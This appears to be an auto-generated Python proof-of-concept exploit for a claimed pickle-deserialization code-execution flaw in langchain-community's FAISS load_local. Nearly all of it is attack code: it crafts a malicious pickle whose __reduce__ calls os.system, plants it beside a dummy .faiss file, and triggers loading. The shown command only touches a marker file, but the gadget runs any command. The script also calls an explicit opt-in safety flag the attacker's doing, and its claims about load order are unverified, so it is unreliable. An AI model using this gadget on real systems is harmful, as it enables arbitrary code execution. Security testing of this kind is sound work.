#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-016
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local_20.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for insecure pickle deserialization in
langchain-community's FAISS vector store load_local function.

Vulnerability: The load_local function uses pickle.load() on a file path
constructed from user-controlled folder_path and index_name parameters.
Although there is an allow_dangerous_deserialization guard, it is a boolean
flag that the caller can set to True, and the code does not validate the
source of the pickle file. An attacker who controls folder_path or index_name
can point to a malicious pickle file, leading to arbitrary code execution.

This PoC demonstrates the vulnerability by:
1. Creating a malicious pickle file that executes a benign command
2. Calling load_local with attacker-controlled folder_path pointing to the
   malicious file and allow_dangerous_deserialization=True
3. Verifying the command was executed

Usage:
    python3 poc.py [--target /path/to/target/directory]
"""

import os
import sys
import pickle
import tempfile
import argparse
import subprocess
from pathlib import Path

# Add the langchain-community path to sys.path for import
sys.path.insert(0, "/tmp/langchain-community-only")


def create_malicious_pickle(output_dir: str, index_name: str) -> str:
    """
    Create a malicious pickle file that executes a benign command.
    
    The pickle payload will execute: touch /tmp/poc_success.txt
    This is a safe, non-destructive command that proves code execution.
    
    Args:
        output_dir: Directory to write the pickle file
        index_name: Base name for the pickle file (will be {index_name}.pkl)
    
    Returns:
        Path to the created pickle file
    """
    # Define a benign command to execute
    command = "touch /tmp/poc_success.txt"
    
    # Create a malicious class that executes the command when unpickled
    class MaliciousPayload:
        def __reduce__(self):
            return (os.system, (command,))
    
    # Write the malicious pickle file
    pickle_path = Path(output_dir) / f"{index_name}.pkl"
    with open(pickle_path, "wb") as f:
        pickle.dump(MaliciousPayload(), f)
    
    print(f"[+] Created malicious pickle file: {pickle_path}")
    print(f"[+] Payload will execute: {command}")
    
    return str(pickle_path)


def create_dummy_faiss_file(output_dir: str, index_name: str) -> str:
    """
    Create a dummy FAISS index file to satisfy the load_local function's
    requirement for a .faiss file. The actual FAISS index loading will fail,
    but the pickle deserialization happens before that error.
    
    Args:
        output_dir: Directory to write the FAISS file
        index_name: Base name for the FAISS file
    
    Returns:
        Path to the created FAISS file
    """
    faiss_path = Path(output_dir) / f"{index_name}.faiss"
    # Write minimal valid FAISS index data (empty index)
    # This will cause FAISS to error, but pickle already executed
    with open(faiss_path, "wb") as f:
        f.write(b"\x00" * 100)  # Invalid FAISS data, but file exists
    
    print(f"[+] Created dummy FAISS file: {faiss_path}")
    return str(faiss_path)


def trigger_exploit(target_dir: str, index_name: str = "test_index"):
    """
    Trigger the vulnerable load_local function with attacker-controlled
    folder_path pointing to our malicious pickle file.
    
    Args:
        target_dir: Directory containing the malicious pickle file
        index_name: Index name used for file naming
    """
    # Import the vulnerable function
    from langchain_community.vectorstores.faiss import FAISS
    
    # Create a mock embeddings object (required by load_local)
    # We use a simple class that mimics the interface
    class MockEmbeddings:
        def embed_query(self, text):
            return [0.0] * 384  # Return dummy embedding
        
        def embed_documents(self, texts):
            return [[0.0] * 384 for _ in texts]
    
    print(f"\n[*] Attempting to trigger deserialization...")
    print(f"[*] Target directory: {target_dir}")
    print(f"[*] Index name: {index_name}")
    
    try:
        # Call load_local with allow_dangerous_deserialization=True
        # This is the vulnerable call - the attacker controls folder_path
        # and index_name, and sets the guard to True
        result = FAISS.load_local(
            folder_path=target_dir,
            embeddings=MockEmbeddings(),
            index_name=index_name,
            allow_dangerous_deserialization=True  # Attacker sets this to True
        )
        print(f"[!] load_local returned: {result}")
    except Exception as e:
        # The FAISS index loading will likely fail, but the pickle
        # deserialization has already occurred by this point
        print(f"[*] Expected error after deserialization: {e}")
        print("[*] The pickle payload should have executed before this error")


def verify_exploit():
    """Verify that the benign command was executed."""
    marker_file = "/tmp/poc_success.txt"
    if os.path.exists(marker_file):
        print(f"\n[+] SUCCESS: Marker file {marker_file} exists!")
        print("[+] The pickle payload was executed, proving RCE is possible.")
        # Clean up the marker file
        os.remove(marker_file)
        return True
    else:
        print(f"\n[-] FAILURE: Marker file {marker_file} not found.")
        print("[-] The exploit may not have worked as expected.")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="PoC for langchain-community FAISS pickle deserialization RCE"
    )
    parser.add_argument(
        "--target",
        default=None,
        help="Directory to use for the exploit (default: temporary directory)"
    )
    parser.add_argument(
        "--index-name",
        default="exploit_index",
        help="Index name to use (default: exploit_index)"
    )
    args = parser.parse_args()
    
    # Use provided target directory or create a temporary one
    if args.target:
        target_dir = args.target
        os.makedirs(target_dir, exist_ok=True)
        print(f"[*] Using target directory: {target_dir}")
    else:
        target_dir = tempfile.mkdtemp(prefix="faiss_exploit_")
        print(f"[*] Created temporary directory: {target_dir}")
    
    try:
        # Step 1: Create the malicious pickle file
        create_malicious_pickle(target_dir, args.index_name)
        
        # Step 2: Create a dummy FAISS file (required by load_local)
        create_dummy_faiss_file(target_dir, args.index_name)
        
        # Step 3: Trigger the exploit
        trigger_exploit(target_dir, args.index_name)
        
        # Step 4: Verify the exploit worked
        verify_exploit()
        
    finally:
        # Clean up temporary directory if we created one
        if not args.target:
            import shutil
            shutil.rmtree(target_dir, ignore_errors=True)
            print(f"[*] Cleaned up temporary directory: {target_dir}")


if __name__ == "__main__":
    main()
